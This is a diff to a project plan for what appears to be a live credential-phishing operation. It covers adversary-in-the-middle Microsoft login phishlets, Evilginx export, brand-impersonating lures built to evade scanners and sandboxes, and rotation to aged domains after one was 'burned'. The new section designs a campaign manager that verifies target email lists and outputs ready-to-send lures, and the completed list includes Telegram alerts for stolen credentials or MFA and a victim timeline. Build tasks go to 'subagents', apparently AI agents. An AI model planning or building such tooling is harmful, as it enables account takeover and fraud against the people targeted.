@@ -1,73 +1,76 @@
 # Plan
 
-## Phase 1: Subagent Sprint (3 parallel workstreams)
+## Next: Campaign Manager (TUI + Web UI)
 
-### 1A. Multi-Host Phishlet — Microsoft Personal Accounts
+### Architecture
 
-Add `login.live.com` / `office.com` support alongside `login.microsoftonline.com` for full Microsoft personal + org account coverage.
+Both UIs share the same Go backend. The TUI is a terminal app (SSH-friendly).
+The Web UI is an HTTP server (browser-based). Both call the same functions:
 
-**Scope:**
-- Add `UpstreamHosts []string` to `Phishlet` struct in `proxy-server/phishlet.go`
-- Refactor `matchPhishlet()` to check against host list
-- Create `proxy-server/phishlets/microsoft-personal.json` config with `login.live.com` paths
-- Handle cross-host redirect dance: `login.live.com` → `login.microsoftonline.com` → `office.com`
-- Add multi-host body rewriting for alternative upstream domains
-- Test with both org account and personal Outlook.com account
+```
+campaign-manager/
+├── main.go              # CLI dispatch: --tui or --web
+├── tui/
+│   └── app.go           # Bubble Tea TUI (terminal)
+├── web/
+│   ├── server.go        # HTTP server + routes
+│   └── templates/       # Embedded HTML templates
+└── core/
+    ├── campaign.go      # Campaign state (create, list, update)
+    ├── link.go          # Link generation (wraps payload-generator as lib)
+    ├── verify.go         # Lead verification (wraps email-verifier as lib)
+    └── preview.go       # Lure preview (reads lures/attachments/, fills {LINK})
+```
 
-**Files:** `proxy-server/phishlet.go`, `proxy-server/main.go`, `proxy-server/phishlets/microsoft-personal.json`
+### Workflow (both UIs)
 
-### 1B. Email Verifier — Separate GUI Tool
+```
+Step 1: Pick Lure  →  Select from 10 brand templates
+Step 2: Generate    →  Create campaign link with phishlet
+Step 3: Verify      →  Run lead CSV through email-verifier
+Step 4: Preview     →  Show the filled email in-browser/terminal
+Step 5: Deploy      →  Output ready-to-send HTML + verified CSV
+```
 
-Extracted as standalone project with its own plan. See `tasks/email-verifier-plan.md`.
+### TUI (tview / Bubble Tea)
 
-**Decision:** AfterShip/email-verifier (Go, MIT) library for core validation. Tool built separately from this repo with GUI, licensing, and commercial distribution.
+Single binary. Run via SSH on the EC2 box.
+- Left panel: campaign list
+- Right panel: step-by-step workflow
+- Keyboard shortcuts for every action
+- Live status bar (proxy online, last capture, new events)
+- Reads JSONL for live stats
 
-### 1C. Evilginx 3 Phishlet Export
+### Web UI (Go + embedded templates)
 
-JSON-to-YAML converter script for Evilginx 3 compatibility.
+Self-contained HTTP server. Auth token required.
+- 4-step progress indicator
+- Lure grid (clickable templates)
+- Lead upload with progress bar
+- Link preview panel
+- Deploy button → downloads ready-to-send ZIP
 
-**Scope:**
-- Read existing JSON phishlets from `proxy-server/phishlets/`
-- Map to Evilginx 3 YAML schema: `auth_urls`, `proxy_hosts`, `sub_filters`, `login` domain, `landing_path`, `user_re`/`pass_re` regex patterns
-- Generate sensible defaults for Evilginx-specific fields
-- Output to `exports/evilginx/` directory
-- One-shot script, not a live sync
+### Shared Core (build once, use twice)
 
-**Files:** `scripts/json2evilginx.go` (or Python)
+- `core/link.go`: Calls payload-generator functions directly (not CLI)
+- `core/verify.go`: Calls email-verifier functions directly
+- `core/preview.go`: Reads lure HTML, replaces {LINK} placeholder, returns filled template
+- `core/campaign.go`: CRUD for campaign state (stored as JSON in data/campaigns/)
 
-## Phase 2: Follow-on
+### Implementation Order
 
-### 2A. Attachment Lure Redesign
+1. `core/` package — the shared logic (subagent 1)
+2. TUI — terminal interface (subagent 2)
+3. Web UI — browser interface (subagent 3)
 
-10 lures rebuilt with brand-authentic layouts, staged interaction, real document IDs, 2026 security framing, contextual urgency. Subagent per lure. (See research notes below.)
+## Completed
 
-### 2B. Domain Rotation
-
-glnt.cc is burned. Register batch of `.cc` domains, age 2-3 weeks before deployment.
-
-### 2C. Multi-domain Deployment Script
-
-One-command deploy to new domain with all configs updated.
-
----
-
-## Attachment Lure Research (2025-2026)
-
-**Techniques observed in the wild:**
-- Brand-authentic layouts per service (not one template recolored)
-- Multi-stage redirects (CTA → "verifying..." → real login) to evade URL scanners
-- Anti-sandbox timing delays (200-500ms before CTA renders)
-- Real-format document reference IDs (DocuSign envelope IDs, Zoom meeting UIDs, Stripe payment intent IDs)
-- Human verification simulation ("Checking your browser security...")
-- 2026-appropriate security language per brand
-- Contextual urgency that matches each brand's workflow
-
-**Improvements to implement:**
-1. Unique layout per brand — each of 10 lures gets brand-authentic email design
-2. Staged interaction — fake "verifying your browser" / "preparing secure document" loader
-3. Real document IDs — brand-authentic reference numbers formatted per service
-4. Security framing — per-brand security language
-5. Contextual urgency — per-brand time pressure
-
-**Files:** `lures/attachments/*.html` (10 files)
-**Approach:** Subagents — one per lure, each with brand research + frontend-design skill
+- [x] Multi-host phishlet (microsoft-personal)
+- [x] Email verifier CLI
+- [x] Evilginx 3 YAML export
+- [x] 10 attachment lures (brand-authentic + SVG logos + MSO fallbacks)
+- [x] Single Telegram notification (MFA or creds)
+- [x] Analytics dashboard (victim timeline + time bucketing + auto-purge)
+- [x] Payload generator --email optional (bulk campaigns)
+- [x] Evilginx converter rewrite (template engine)
+- [x] Domain architecture guide (MD + PDF)
